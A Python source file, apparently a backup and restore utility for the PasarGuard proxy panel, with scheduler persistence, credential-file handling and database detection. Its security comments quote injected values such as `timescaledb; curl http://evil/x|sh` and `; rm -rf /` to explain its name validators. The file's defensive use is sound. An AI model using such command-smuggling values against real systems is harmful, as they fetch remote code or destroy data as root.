#!/usr/bin/env python3
# ============================================================
#   Pasarguard Backup Utility  v4.2.1
#   Dev by: CIA
#   GitHub: https://github.com/CIAUB
#   v4.0 — multi-database support: backs up & restores EVERY Pasarguard DB
#          (not just the legacy "pasarguard" database).
#   v4.1 — full compatibility with the official PasarGuard panel
#          (https://github.com/PasarGuard/panel): detects and handles all
#          five supported backends — sqlite, postgresql, timescaledb, mysql,
#          mariadb — including single-file sqlite backups, mysqldump for
#          MySQL/MariaDB, and per-database pg_dump for PostgreSQL/TimescaleDB.
#   v4.2 — security & bugfix pass:
#          * fixed shell command injection in Manual Restore (zip filename
#            was interpolated unquoted into a shell=True command)
#          * fixed MySQL/MariaDB backup & restore: MYSQL_PWD is now passed
#            into the container via `docker compose exec -e`, not set on the
#            host process (which docker compose does not forward)
#          * bot token / chat id no longer passed as plaintext CLI args
#            (leaked via `ps`/`/proc/<pid>/cmdline` and world-readable
#            systemd unit files) — now written to a 0600 credentials file
#          * passwords are now read with getpass (no terminal echo)
#          * backup archives are chmod 600 on disk (they contain .env
#            secrets)
#          * SSH host-key auto-accept now prints an explicit warning
#          * Telegram Bot API's 50 MB per-file limit is fully handled:
#            oversized backups are transparently split into numbered
#            .001/.002/... chunks on send, and on the restore side
#            (Manual Restore) the chunks are auto-detected, verified for
#            completeness, and rejoined into the original archive before
#            extraction — no manual `cat` needed.
#          * "Manage Backup Schedulers" can now restart an instance so it
#            picks up the latest script code without deleting and
#            recreating it, and can update a running scheduler's bot
#            token / admin chat ID in place.
#   v4.2.1 — security hardening pass:
#          * `/tmp` backup staging dir replaced with tempfile.mkdtemp
#            (0700) so the unencrypted .env + DB dump isn't world-readable
#            mid-backup
#          * `curl | sudo bash` auto-update replaced with a
#            download-to-temp / verify-sha256 / then-exec flow (a
#            compromised raw.githubusercontent.com payload no longer
#            gets piped straight into a root shell on confirm)
#          * strict instance-name validator ([A-Za-z0-9_-]+) used by every
#            function that builds a filesystem path, systemd unit name,
#            screen/tmux session name, or shell=True command from user
#            input — closes the path-traversal in /etc/pasarguard-backup
#            that v4.2 introduced, plus the unit/session name injection
#            in `Manage Backup Schedulers`. shlex.quote() added to the
#            same shell=True spots as defence-in-depth
#          * SQLite restore target is now realpath-checked against
#            /var/lib/pasarguard/ so a malicious backup's
#            SQLALCHEMY_DATABASE_URL can't redirect cp to /etc/cron.d etc.
#          * manifest.sql_file is rejected if it contains `..`, `/`, or
#            `\` (path-traversal in restore)
# ============================================================

import os, sys, subprocess, datetime, shutil, re, tempfile, hashlib, zipfile
import time, urllib.request, urllib.error, uuid, threading, itertools
import argparse, shlex, socket, getpass, json, stat

# ── ANSI Colors ──────────────────────────────────────────────
# Three red tones for hierarchy:
#   R1  bright red  — active labels, prompts, highlights
#   R2  mid red     — secondary info, borders, dividers
#   R3  dark red    — dim text, decorations
#   WH  white       — message body text (keeps readability)
#   BLD bold
#   DIM dim
class C:
    RESET = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    R1    = "\033[38;2;255;80;80m"    # bright red  — titles, selections
    R2    = "\033[38;2;200;50;50m"    # mid red     — labels, borders
    R3    = "\033[38;2;120;20;20m"    # dark red    — dim / decorative
    WH    = "\033[97m"                # white       — readable body text

def clr():
    os.system("clear")

def tw():
    try: return os.get_terminal_size().columns
    except: return 80

def hline(ch="─"):
    return C.R3 + ch * tw() + C.RESET

def center(s, raw_len=None):
    l = raw_len if raw_len is not None else len(s)
    pad = max(0, (tw() - l) // 2)
    return " " * pad + s

# ── Status helpers ───────────────────────────────────────────
def ok(msg):   print(f"  {C.R1}+{C.RESET}  {C.WH}{msg}{C.RESET}")
def err(msg):  print(f"  {C.R1}x{C.RESET}  {C.WH}{msg}{C.RESET}")
def info(msg): print(f"  {C.R2}>{C.RESET}  {C.WH}{msg}{C.RESET}")
def warn(msg): print(f"  {C.R1}!{C.RESET}  {C.WH}{msg}{C.RESET}")

def print_success(msg): print(f"  {C.R1}[OK]{C.RESET}   {C.WH}{msg}{C.RESET}")
def print_error(msg):   print(f"  {C.R1}[ERR]{C.RESET}  {C.WH}{msg}{C.RESET}")
def print_info(msg):    print(f"  {C.R2}[..]{C.RESET}   {C.WH}{msg}{C.RESET}")
def print_warning(msg): print(f"  {C.R1}[!!]{C.RESET}   {C.WH}{msg}{C.RESET}")

def pause_and_return():
    input(f"\n  {C.R2}Press ENTER to return to the main menu...{C.RESET}")

# ── Spinner ──────────────────────────────────────────────────
class Spinner:
    def __init__(self, message="Processing..."):
        self.cycle  = itertools.cycle(['-', '\\', '|', '/'])
        self.stop   = threading.Event()
        self.msg    = message
        self.thread = threading.Thread(target=self._spin)

    def _spin(self):
        while not self.stop.is_set():
            sys.stdout.write(f"\r  {C.R2}{next(self.cycle)}{C.RESET}  {C.WH}{self.msg}{C.RESET}")
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write('\r' + ' ' * (len(self.msg) + 15) + '\r')
        sys.stdout.flush()

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *_):
        self.stop.set()
        self.thread.join()

# ── Auto-install paramiko ────────────────────────────────────
# Skip this when running as the headless daemon child (spawned by screen /
# tmux / systemd) so the persistence layer doesn't repeat the apt/pip dance.
if "--daemon-backup" not in sys.argv:
    try:
        import paramiko
    except ImportError:
        print(f"  {C.R2}[..]{C.RESET}  {C.WH}Required libraries not found. Installing...{C.RESET}")
        with Spinner("Installing Paramiko... Please wait"):
            try:
                subprocess.check_call(["apt-get", "update"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.check_call(["apt-get", "install", "-y", "python3-paramiko", "python3-pip", "unzip"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko", "--quiet"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        import paramiko
        print(f"  {C.R1}[OK]{C.RESET}  {C.WH}Libraries installed successfully!{C.RESET}\n")

# ── Auto-install PySocks (needed for SOCKS4/5 proxy support) ──
# Unlike paramiko, this one is NOT skipped for the daemon child, since the
# scheduled backup loop itself may need to reach Telegram through a SOCKS proxy.
try:
    import socks as _pysocks
except ImportError:
    if "--daemon-backup" not in sys.argv:
        print(f"  {C.R2}[..]{C.RESET}  {C.WH}Installing PySocks (SOCKS proxy support)...{C.RESET}")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pysocks", "--quiet"],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    try:
        import socks as _pysocks
    except ImportError:
        _pysocks = None

# ── Paths ────────────────────────────────────────────────────
PASARGUARD_DIR      = "/opt/pasarguard"
PG_NODE_DIR         = "/opt/pg-node"
PASARGUARD_DATA_DIR = "/var/lib/pasarguard"
PG_NODE_DATA_DIR    = "/var/lib/pg-node"

COMPOSE_DOWN_TIMEOUT    = 30
POSTGRES_READY_MAX_WAIT = 120
POSTGRES_READY_INTERVAL = 2
COMPOSE_UP_MAX_WAIT     = 120
COMPOSE_UP_INTERVAL     = 3
COMPOSE_STOP_RETRIES    = 3

SCREEN_SESSION_BASE    = "pasarguard_backup"
TMUX_SESSION_BASE      = "pasarguard_backup"
SYSTEMD_SERVICE_BASE   = "pasarguard-backup"
SYSTEMD_UNIT_DIR       = "/etc/systemd/system"

# v4.2 — credentials directory for scheduler daemons. Files here hold the
# bot token / chat id / proxy for a given scheduler instance instead of
# passing them as CLI arguments (which leak via `ps`, /proc/<pid>/cmdline,
# and world-readable systemd unit files). Each file is chmod 600.
CREDS_DIR = "/etc/pasarguard-backup"

# v4.2.1 — strict validator for instance/file names that get embedded into
# filesystem paths, systemd unit names, screen/tmux session names, or
# shell=True commands. Anything outside [A-Za-z0-9_-]+ is rejected. Defence
# in depth — the user (running as root) is already trusted, but a single
# `../` or `; rm -rf /` slipping through here becomes a path-traversal
# RCE elsewhere. The two existing places this used to land unsafely are
# _creds_path() (writes/reads /etc/pasarguard-backup/<name>.json) and
# ask_instance_name() (returns the suffix used in unit/session names).
_INSTANCE_NAME_RE = re.compile(r"^[A-Za-z0-9_-]+$")

def _validate_instance_name(name, *, allow_empty=False):
    if not name:
        if allow_empty:
            return ""
        raise ValueError("empty name")
    if not _INSTANCE_NAME_RE.match(name):
        raise ValueError(
            f"invalid name {name!r} — only letters, digits, '_' and '-' are allowed"
        )
    return name

def _creds_path(instance):
    safe = instance or "default"
    # v4.2.1 — refuse anything that could escape CREDS_DIR before we
    # touch the filesystem. _validate_instance_name raises ValueError on
    # a bad name; callers (write_daemon_creds / read_daemon_creds /
    # read_daemon_meta / run_daemon_from_args) propagate that.
    _validate_instance_name(safe)
    return os.path.join(CREDS_DIR, f"{safe}.json")

# v4.2.1 — validator for docker compose service names. `svc` is extracted
# from docker-compose.yml / `docker compose config` output and then
# interpolated (without quoting, until this fix) into shell=True commands
# like `docker compose exec -T {shlex.quote(svc)} ...`. A malicious or tampered compose
# file with a service named, say, `timescaledb; curl http://evil/x|sh`,
# would then inject arbitrary commands as root. Defence in depth: the
# service name is validated at extraction AND shlex.quote() is applied at
# every shell-use site below.
_SAFE_SERVICE_NAME_RE = re.compile(r"^[A-Za-z0-9_.-]+$")

def _validate_service_name(svc, *, allow_empty=False):
    if not svc:
        if allow_empty:
            return ""
        raise ValueError("empty service name")
    if not _SAFE_SERVICE_NAME_RE.match(svc):
        raise ValueError(
            f"unsafe docker service name {svc!r} — only letters, digits, '_', '.', '-' are allowed"
        )
    return svc

def write_daemon_creds(instance, bot_token, admin_id, proxy=None, interval_h=None, include_node=None):
    """Persist everything a scheduler instance needs to run: token, chat id,
    proxy, interval, and scope. Storing interval/include_node here (not just
    token/chat) means 'Manage Backup Schedulers' can fully reconstruct the
    daemon command later — to restart a screen/tmux session with the exact
    same settings, or to push an updated token/chat id — without asking the
    user to re-enter everything from scratch. Merges with any existing file
    so partial updates (e.g. token-only) don't wipe out other fields."""
    os.makedirs(CREDS_DIR, exist_ok=True)
    try:
        os.chmod(CREDS_DIR, 0o700)
    except Exception:
        pass
    path = _creds_path(instance)
    existing = {}
    if os.path.exists(path):
        try:
            with open(path) as f:
                existing = json.load(f)
        except Exception:
            existing = {}
    data = {
        "token":    bot_token if bot_token is not None else existing.get("token", ""),
        "chat":     admin_id if admin_id is not None else existing.get("chat", ""),
        "proxy":    (proxy if proxy is not None else existing.get("proxy", "")) or "",
        "interval": interval_h if interval_h is not None else existing.get("interval", 1.0),
        "node":     include_node if include_node is not None else existing.get("node", False),
    }
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w") as f:
        json.dump(data, f)
    os.chmod(path, 0o600)
    return path

def read_daemon_creds(instance):
    path = _creds_path(instance)
    with open(path) as f:
        data = json.load(f)
    return data.get("token", ""), data.get("chat", ""), (data.get("proxy") or None)

def read_daemon_meta(instance):
    """Full stored config for a scheduler instance (token/chat/proxy/interval/
    node), or None if no credentials file exists for it. Used by 'Manage
    Backup Schedulers' to rebuild the exact daemon command for a restart."""
    path = _creds_path(instance)
    if not os.path.exists(path):
        return None
    try:
        with open(path) as f:
            data = json.load(f)
    except Exception:
        return None
    return {
        "token":    data.get("token", ""),
        "chat":     data.get("chat", ""),
        "proxy":    data.get("proxy") or None,
        "interval": data.get("interval", 1.0),
        "node":     bool(data.get("node", False)),
    }

def _migrate_legacy_systemd_instance(name):
    """One-time upgrade path for a systemd scheduler that was created by a
    pre-v4.2 version of this script, where --token/--chat/--interval/--node
    were baked in plaintext inside ExecStart= (world-readable, and visible
    in `ps`). Reads the old unit file, pulls the values back out, writes
    them into the new 0600 credentials file, and rewrites ExecStart to the
    new token-free form — so 'Restart' / 'Update Bot Token' work on it going
    forward exactly like a scheduler created fresh in v4.2.

    Returns the migrated meta dict on success, or None if the unit file
    can't be found/parsed (e.g. it's already using the new format, or it's
    not a scheduler this script created)."""
    unit_path = f"{SYSTEMD_UNIT_DIR}/{name}.service"
    if not os.path.exists(unit_path):
        return None
    try:
        with open(unit_path) as f:
            unit_text = f.read()
    except Exception:
        return None

    exec_line = None
    for line in unit_text.splitlines():
        if line.strip().startswith("ExecStart="):
            exec_line = line.strip()[len("ExecStart="):]
            break
    if not exec_line:
        return None

    try:
        argv = shlex.split(exec_line)
    except ValueError:
        return None

    token = chat = proxy = None
    interval = 1.0
    include_node = False
    i = 0
    while i < len(argv):
        a = argv[i]
        if a == "--token" and i + 1 < len(argv):
            token = argv[i + 1]; i += 2; continue
        if a == "--chat" and i + 1 < len(argv):
            chat = argv[i + 1]; i += 2; continue
        if a == "--proxy" and i + 1 < len(argv):
            proxy = argv[i + 1]; i += 2; continue
        if a == "--interval" and i + 1 < len(argv):
            try:
                interval = float(argv[i + 1])
            except ValueError:
                pass
            i += 2; continue
        if a == "--node":
            include_node = True; i += 1; continue
        i += 1

    if not token or not chat:
        # Nothing usable to migrate (already new-format, or a foreign unit).
        return None

    print_info(f"Migrating '{name}' from the old plaintext-credentials format to the secure 0600 store...")
    write_daemon_creds(name, token, chat, proxy, interval_h=interval, include_node=include_node)

    # Rewrite ExecStart to the new token-free invocation and lock the unit
    # file down, same as launch_via_systemd does for freshly created ones.
    new_daemon_cmd = build_daemon_command(interval, include_node, instance=name)
    new_unit_text = "\n".join(
        (f"ExecStart={new_daemon_cmd}" if line.strip().startswith("ExecStart=") else line)
        for line in unit_text.splitlines()
    ) + "\n"
    try:
        with open(unit_path, "w") as f:
            f.write(new_unit_text)
        os.chmod(unit_path, 0o600)
        run_command("systemctl daemon-reload", quiet=True)
    except Exception as e:
        print_warning(f"Credentials were migrated, but updating the unit file failed: {e}")
        print_warning("The old token may still be readable in the unit file — consider removing")
        print_warning("and recreating this scheduler instance instead.")

    print_success(f"'{name}' migrated — credentials are now stored in {_creds_path(name)} (mode 600).")
    return read_daemon_meta(name)

# Per-instance status files so the "Manage Backup Schedulers" menu can show
# whether an instance is currently backing up or sleeping until its next run,
# instead of just a raw process-alive check.
# v4.2.1 — state lives under the same /etc/pasarguard-backup tree (0700,
# root-owned) instead of /tmp. Even though state files don't carry secrets,
# a local attacker who could write to /tmp/<...>.state could trick the
# "Manage Backup Schedulers" menu into showing the wrong status.
STATE_DIR = os.path.join(CREDS_DIR, "state")
_STATE_DIR_READY = False

def _ensure_state_dir():
    global _STATE_DIR_READY
    if _STATE_DIR_READY:
        return True
    try:
        os.makedirs(STATE_DIR, mode=0o700, exist_ok=True)
        # CREDS_DIR itself is also 0700 from write_daemon_creds, but
        # belt-and-braces in case the state dir was created before that.
        os.chmod(STATE_DIR, 0o700)
        _STATE_DIR_READY = True
        return True
    except Exception:
        return False

def _state_file(instance):
    return os.path.join(STATE_DIR, f"{instance}.state")

def write_state(instance, phase, extra=""):
    if not instance:
        return
    if not _ensure_state_dir():
        return
    try:
        path = _state_file(instance)
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "w") as f:
            f.write(f"{phase}|{extra}|{time.time()}")
    except Exception:
        pass

def read_state(instance):
    """Returns (phase, extra, age_seconds) or None."""
    try:
        with open(_state_file(instance)) as f:
            phase, extra, ts = f.read().split("|", 2)
        return phase, extra, time.time() - float(ts)
    except Exception:
        return None

# ── Logo / Header ────────────────────────────────────────────
LOGO = [
    "██████╗  ██████╗ ██████╗  █████╗  ██████╗██╗  ██╗██╗   ██╗██████╗ ",
    "██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║   ██║██╔══██╗",
    "██████╔╝██║  ███╗██████╔╝███████║██║     █████╔╝ ██║   ██║██████╔╝",
    "██╔═══╝ ██║   ██║██╔══██╗██╔══██║██║     ██╔═██╗ ██║   ██║██╔═══╝ ",
    "██║     ╚██████╔╝██████╔╝██║  ██║╚██████╗██║  ██╗╚██████╔╝██║     ",
    "╚═╝      ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ",
]
LOGO_W = 71

def print_header(title=""):
    clr()
    print()
    for line in LOGO:
        print(center(C.R1 + C.BOLD + line + C.RESET, LOGO_W))
    sub = C.R1 + C.BOLD + "B A C K U P   U T I L I T Y   v 4 . 2 . 1   -   C I A U B" + C.RESET
    print(center(sub, 57))
    print()
    print(hline())
    if title:
        print()
        print(center(C.R1 + C.BOLD + title + C.RESET, len(title)))
    print()

# ── Shell helpers ─────────────────────────────────────────────
def local_shell(command, cwd=None):
    try:
        r = subprocess.run(command, shell=True, cwd=cwd, capture_output=True, text=True)
        return r.returncode == 0, r.stdout.strip(), r.stderr.strip()
    except Exception as e:
        return False, "", str(e)

def run_command(cmd, output_file=None, cwd=None, quiet=True):
    try:
        if output_file:
            with open(output_file, "w") as f:
                subprocess.run(cmd, shell=True, check=True, stdout=f, stderr=subprocess.PIPE, cwd=cwd)
        else:
            stdout_t = subprocess.DEVNULL if quiet else None
            subprocess.run(cmd, shell=True, check=True, stdout=stdout_t, stderr=subprocess.PIPE, cwd=cwd)
        return True
    except subprocess.CalledProcessError as e:
        print_error(f"Command failed: {cmd}")
        if e.stderr:
            print_error(f"Details: {e.stderr.decode('utf-8').strip()}")
        return False

def ssh_shell(ssh, command):
    stdin, stdout, stderr = ssh.exec_command(command)
    exit_status = stdout.channel.recv_exit_status()
    return exit_status, stdout.read().decode().strip(), stderr.read().decode().strip()

def execute_ssh_command(ssh, command, description, required=True):
    print(f"  {C.R2}[SSH]{C.RESET}  {C.WH}{description}...{C.RESET}")
    exit_status, out, er = ssh_shell(ssh, command)
    if exit_status == 0:
        ok("Done.")
    else:
        err_msg = er or out
        print_error("Command failed!")
        if err_msg:
            print_error(f"Details: {err_msg}")
    return exit_status == 0 if required else True

# ── Persistence helpers (screen / tmux / systemd) ─────────────
def ensure_tool_installed(binary, pkg=None):
    """Make sure a local CLI tool (screen/tmux) is available, installing it via apt if missing."""
    pkg = pkg or binary
    if shutil.which(binary):
        return True
    print_info(f"'{binary}' not found. Installing '{pkg}'...")
    with Spinner(f"Installing {pkg}..."):
        run_command("apt-get update", quiet=True)
        run_command(f"apt-get install -y {pkg}", quiet=True)
    if shutil.which(binary):
        print_success(f"'{pkg}' installed.")
        return True
    print_error(f"Failed to install '{pkg}'. Please install it manually and try again.")
    return False

def build_daemon_command(interval_h, include_node, instance=None):
    """Builds the exact CLI invocation used to re-run this same script
    headlessly. v4.2: the bot token / chat id / proxy are NOT passed here
    any more — they're written to a 0600 credentials file (see
    write_daemon_creds) and the daemon reads them back by --instance name,
    so they never appear in `ps`, /proc/<pid>/cmdline, or a systemd unit
    file (which is world-readable by default)."""
    script_path = os.path.abspath(__file__)
    parts = [
        sys.executable, script_path, "--daemon-backup",
        "--interval", str(interval_h),
        "--instance", instance or "default",
    ]
    if include_node:
        parts.append("--node")
    return " ".join(shlex.quote(p) for p in parts)

def systemd_unit_name(suffix):
    return f"{SYSTEMD_SERVICE_BASE}-{suffix}"

def systemd_unit_path(suffix):
    return f"{SYSTEMD_UNIT_DIR}/{systemd_unit_name(suffix)}.service"

def list_systemd_backup_units():
    """Return [(suffix, unit_name, active_bool), ...] for every installed
    pasarguard-backup-* systemd service (so multiple schedulers can coexist)."""
    if shutil.which("systemctl") is None:
        return []
    ok_v, out, _ = local_shell(
        f"systemctl list-units --all --type=service --no-legend --plain '{SYSTEMD_SERVICE_BASE}-*.service' 2>/dev/null")
    units = []
    if ok_v and out:
        for line in out.splitlines():
            parts = line.split()
            if not parts:
                continue
            unit = parts[0]
            if not unit.endswith(".service"):
                continue
            name = unit[:-len(".service")]
            if not name.startswith(SYSTEMD_SERVICE_BASE + "-"):
                continue
            suffix = name[len(SYSTEMD_SERVICE_BASE) + 1:]
            # columns are: UNIT LOAD ACTIVE SUB DESCRIPTION...
            active = len(parts) > 3 and parts[2] == "active" and parts[3] in ("running", "start-pre", "start")
            units.append((suffix, name, active))
    return units

def list_screen_sessions():
    ok_v, out, _ = local_shell("screen -list 2>/dev/null")
    names = []
    if ok_v and out:
        import re
        for line in out.splitlines():
            m = re.search(r"\d+\.(" + re.escape(SCREEN_SESSION_BASE) + r"(?:-[^\s]+)?)", line)
            if m:
                names.append(m.group(1))
    return names

def list_tmux_sessions():
    ok_v, out, _ = local_shell("tmux list-sessions -F '#{session_name}' 2>/dev/null")
    names = []
    if ok_v and out:
        for line in out.splitlines():
            line = line.strip()
            if line.startswith(TMUX_SESSION_BASE):
                names.append(line)
    return names

def next_free_suffix(existing_names, base):
    """Given a list of full names like 'pasarguard-backup-2', find the
    lowest free numeric suffix (1, 2, 3, ...) not already taken."""
    taken = set()
    for n in existing_names:
        if n.startswith(base + "-"):
            taken.add(n[len(base) + 1:])
        elif n == base:
            taken.add("")
    i = 1
    while str(i) in taken:
        i += 1
    return str(i)

def ask_instance_name(kind):
    """Ask the user for a name/suffix for a new scheduler instance so several
    can run side by side (e.g. pasarguard-backup-1, pasarguard-backup-2)
    without clashing. Shows what already exists and lets the user rename
    to avoid collisions.

    v4.2.1 — the user-supplied suffix is strictly validated (only
    [A-Za-z0-9_-]+). Without this, a name such as `1; rm -rf /` would
    ride through into the systemd unit file, the screen/tmux session
    name, the credentials-file path, and every shell=True command below,
    becoming a one-line root RCE the moment the user creates a scheduler."""
    if kind == "systemd":
        base = SYSTEMD_SERVICE_BASE
        existing_full = [name for _, name, _ in list_systemd_backup_units()]
    elif kind == "screen":
        base = SCREEN_SESSION_BASE
        existing_full = list_screen_sessions()
    else:
        base = TMUX_SESSION_BASE
        existing_full = list_tmux_sessions()

    if existing_full:
        print_info(f"Existing {kind} schedulers: {', '.join(existing_full)}")

    suggested_suffix = next_free_suffix(existing_full, base)
    suggested_name    = f"{base}-{suggested_suffix}"

    print(f"  {C.R2}Give this scheduler instance a name so it can run alongside others.{C.RESET}")
    while True:
        name = input(f"  {C.R2}> Instance name [{suggested_name}]: {C.RESET}").strip()
        if not name:
            return suggested_name
        full_name = name if name.startswith(base) else f"{base}-{name}"
        # The base prefix is hard-coded (safe); validate only the
        # user-supplied suffix part. This catches shell metachars, `..`,
        # `/`, etc.
        if full_name.startswith(base + "-"):
            suffix = full_name[len(base) + 1:]
        else:
            suffix = full_name[len(base):]
        try:
            _validate_instance_name(suffix)
        except ValueError as e:
            print_error(f"{e} (in the part after '{base}-').")
            continue
        if full_name in existing_full:
            print_error(f"'{full_name}' is already in use — pick another name.")
            continue
        return full_name

def ask_persistence_mode():
    print()
    print(f"  {C.R2}How should the scheduler keep running after this SSH session closes?{C.RESET}")
    print()
    print(f"  {C.R1}1{C.RESET}  {C.R3}-{C.RESET}  {C.WH}None{C.RESET}      {C.R3}(runs in this terminal only; stops when SSH disconnects){C.RESET}")
    print(f"  {C.R1}2{C.RESET}  {C.R3}-{C.RESET}  {C.WH}screen{C.RESET}    {C.R3}(detached 'screen' session on the server){C.RESET}")
    print(f"  {C.R1}3{C.RESET}  {C.R3}-{C.RESET}  {C.WH}tmux{C.RESET}      {C.R3}(detached 'tmux' session on the server){C.RESET}")
    print(f"  {C.R1}4{C.RESET}  {C.R3}-{C.RESET}  {C.WH}systemd{C.RESET}   {C.R3}(background service; survives reboot too){C.RESET}")
    print()
    while True:
        choice = input(f"  {C.R2}> Enter 1, 2, 3 or 4: {C.RESET}").strip()
        if choice in ("1", "2", "3", "4"):
            return choice
        print_error("Invalid choice. Enter 1, 2, 3 or 4.")

def launch_via_screen(daemon_cmd, session_name=None):
    if not ensure_tool_installed("screen"):
        return False
    session_name = session_name or ask_instance_name("screen")
    # v4.2.1 — validate + shlex.quote before any shell=True use.
    _validate_instance_name(session_name)
    q = shlex.quote(session_name)
    exists, _, _ = local_shell(f"screen -list | grep -q '\\.{q}\\b'")
    if exists:
        print_warning(f"A screen session named '{session_name}' already exists.")
        kill_it = input(f"  {C.R2}> Kill it and start a fresh one? (y/n): {C.RESET}").strip().lower()
        if kill_it != "y":
            print_warning("Aborted — leaving the existing session untouched.")
            return False
        run_command(f"screen -S {q} -X quit", quiet=True)
    if not run_command(f"screen -dmS {q} {daemon_cmd}"):
        print_error("Failed to start the screen session.")
        return False
    print_success(f"Scheduler started in detached screen session '{session_name}'.")
    print_info(f"Reattach anytime with:  screen -r {session_name}")
    print_info(f"Stop it with:           screen -S {session_name} -X quit")
    print_info("Tip: use menu option 'Manage Backup Schedulers' to stop/restart/remove it safely.")
    return True

def launch_via_tmux(daemon_cmd, session_name=None):
    if not ensure_tool_installed("tmux"):
        return False
    session_name = session_name or ask_instance_name("tmux")
    # v4.2.1 — validate + shlex.quote before any shell=True use.
    _validate_instance_name(session_name)
    q = shlex.quote(session_name)
    exists, _, _ = local_shell(f"tmux has-session -t {q} 2>/dev/null")
    if exists:
        print_warning(f"A tmux session named '{session_name}' already exists.")
        kill_it = input(f"  {C.R2}> Kill it and start a fresh one? (y/n): {C.RESET}").strip().lower()
        if kill_it != "y":
            print_warning("Aborted — leaving the existing session untouched.")
            return False
        run_command(f"tmux kill-session -t {q}", quiet=True)
    if not run_command(f"tmux new-session -d -s {q} {daemon_cmd}"):
        print_error("Failed to start the tmux session.")
        return False
    print_success(f"Scheduler started in detached tmux session '{session_name}'.")
    print_info(f"Reattach anytime with:  tmux attach -t {session_name}")
    print_info(f"Stop it with:           tmux kill-session -t {session_name}")
    print_info("Tip: use menu option 'Manage Backup Schedulers' to stop/restart/remove it safely.")
    return True

def launch_via_systemd(daemon_cmd, unit_name=None):
    if shutil.which("systemctl") is None:
        print_error("systemctl not found — this server does not appear to use systemd.")
        return False
    if unit_name is None:
        unit_name = ask_instance_name("systemd")
    unit_path = f"{SYSTEMD_UNIT_DIR}/{unit_name}.service"
    unit = (
        "[Unit]\n"
        f"Description=PasarGuard Scheduled Backup ({unit_name})\n"
        "After=network-online.target docker.service\n"
        "Wants=network-online.target\n\n"
        "[Service]\n"
        "Type=simple\n"
        f"ExecStart={daemon_cmd}\n"
        "Restart=always\n"
        "RestartSec=10\n"
        "User=root\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n"
    )
    try:
        with open(unit_path, "w") as f:
            f.write(unit)
        # v4.2: unit files are world-readable by default (0644). The daemon
        # command no longer contains secrets (see build_daemon_command), but
        # keep the unit itself tight anyway.
        os.chmod(unit_path, 0o600)
    except Exception as e:
        print_error(f"Could not write unit file: {e}")
        return False

    print_info("Reloading systemd and enabling the service...")
    # v4.2.1 — quote unit_name in shell=True commands. unit_name was
    # already validated by ask_instance_name(), this is defence in depth.
    _validate_instance_name(unit_name)
    q = shlex.quote(unit_name)
    steps = [
        ("systemctl daemon-reload", "daemon-reload"),
        (f"systemctl enable {q}", "enable"),
        (f"systemctl restart {q}", "start"),
    ]
    for cmd, label in steps:
        if not run_command(cmd):
            print_error(f"systemctl {label} failed.")
            return False

    print_success(f"Scheduler installed as systemd service '{unit_name}'.")
    print_info(f"Check status with:  systemctl status {unit_name}")
    print_info(f"Live logs with:     journalctl -u {unit_name} -f")
    print_info(f"Stop it with:       systemctl stop {unit_name}")
    print_info("Tip: use menu option 'Manage Backup Schedulers' to stop/restart/remove it safely,")
    print_info("     and you can install another instance alongside this one (e.g. -2, -3, ...).")
    return True

# ── DB service auto-detection ──────────────────────────────────
# The DB container is not always named "timescaledb" across PasarGuard
# installs/forks — it can be postgres, postgresql, pgsql, db, etc.
# We detect it once (from docker-compose.yml) and cache it for the
# rest of the run instead of assuming a fixed name.
_DB_SERVICE_CACHE = {}

def _detect_db_service_local(d=None):
    d = d or PASARGUARD_DIR
    if d in _DB_SERVICE_CACHE:
        return _DB_SERVICE_CACHE[d]
    ok_v, out, _ = local_shell("docker compose config --services", cwd=d)
    services = [l.strip() for l in out.splitlines() if l.strip()] if ok_v else []
    svc = _pick_db_service(services)
    _DB_SERVICE_CACHE[d] = svc
    return svc

def _detect_db_service_ssh(ssh, d=None):
    d = d or PASARGUARD_DIR
    key = ("ssh", d)
    if key in _DB_SERVICE_CACHE:
        return _DB_SERVICE_CACHE[key]
    ec, out, _ = ssh_shell(ssh, f"cd {d} && docker compose config --services 2>/dev/null")
    services = [l.strip() for l in out.splitlines() if l.strip()] if ec == 0 else []
    svc = _pick_db_service(services)
    _DB_SERVICE_CACHE[key] = svc
    return svc

def _pick_db_service(services):
    """Pick the DB service name out of a list of compose services.
    Falls back to asking the user if it can't decide on its own.

    v4.2.1 — strips any non-service top-level keys that slipped through
    the parser (e.g. `services`, `name`, `version`). Without this, a buggy
    parser returning `['services']` would cause the script to try to
    exec into a non-existent service literally called 'services'."""
    if not services:
        print_warning("Could not read docker-compose services — defaulting to 'timescaledb'.")
        return "timescaledb"

    safe = [s for s in services if s not in _NON_SERVICE_KEYS and _SAFE_SERVICE_NAME_RE.match(s)]
    if not safe:
        print_warning("No valid service names in compose output — defaulting to 'timescaledb'.")
        return "timescaledb"

    if len(safe) == 1:
        return safe[0]

    keywords = ["timescaledb", "postgres", "postgresql", "pgsql", "db", "database"]
    candidates = [s for s in safe if any(k in s.lower() for k in keywords)]

    if len(candidates) == 1:
        return candidates[0]

    print_warning(f"Multiple candidate DB services found: {', '.join(candidates or safe)}")
    choice = input(f" {C.R2}> Which service is the PostgreSQL database? {C.RESET}").strip()
    return choice if choice in safe else (candidates[0] if candidates else safe[0])

def db_service_local(d=None):
    return _detect_db_service_local(d)

def db_service_ssh(ssh, d=None):
    return _detect_db_service_ssh(ssh, d)

# ── Multi-database discovery (v4.0) ───────────────────────────
_SYSTEM_DBS = ("postgres", "template0", "template1")

def _list_databases_local(svc):
    query = ("SELECT datname FROM pg_database "
             "WHERE datistemplate=false AND datname NOT IN "
             "('postgres','template0','template1') ORDER BY datname;")
    ok_v, out, _ = local_shell(
